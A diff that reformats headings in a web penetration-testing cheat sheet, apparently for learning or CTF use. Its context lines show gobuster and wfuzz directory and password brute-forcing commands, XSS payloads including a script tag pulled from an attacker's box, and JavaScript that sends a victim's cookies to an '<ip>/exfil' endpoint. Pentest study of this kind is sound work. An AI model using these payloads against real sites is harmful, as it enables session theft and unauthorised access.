@@ -14,11 +14,11 @@ To generate dictionaries, use the cewl tool.
 
 Gobuster is a tool that helps with directory and subdomain bruteforcing.
 Repository: https://github.com/OJ/gobuster
-Installation command:
+### Installation command:
 ```
 go install github.com/OJ/gobuster/v3@latest
 ```
-Example usage:
+### Example usage:
 
 ```
 gobuster dir -u http://188.72.108.59:10008/ -w /usr/share/dirb/wordlists/common.txt -t 5
@@ -31,7 +31,7 @@ gobuster dns -d <site.com> -w /usr/share/dirb/wordlists/common.txt #subdomains
 
 Wfuzz is a tool for file and login page bruteforcing.
 
-Example usage:
+### Example usage:
 
 ```
 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "<site.com>" #files discovery
@@ -43,20 +43,20 @@ wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100
 Reflected XSS: Creating a malicious link that needs to be sent to someone.
 Stored XSS: Embedding a trap directly into the website.
 
-Examples:
+### Examples:
 If you need to create an alert in an `<h1>` tag:
 
 ```
 <img src='x' onerror='alert(1)'>
 ```
 
-Injection:
+### Injection:
 
 ```
 <script src="http://<ip of your box>/xss.js"></script>
 ```
 
-Cookie Stealing and Data Exfiltration
+### Cookie Stealing and Data Exfiltration
 
 To obtain the cookie file:
 
@@ -66,6 +66,6 @@ let encodedCookie = encodeURIComponent(cookie);
 fetch("http://<ip>/exfil?data=" + encodedCookie);
 ```
 
-Contribution
+# Contribution
 
 Feel free to contribute to this repository by adding more notes or suggesting improvements.
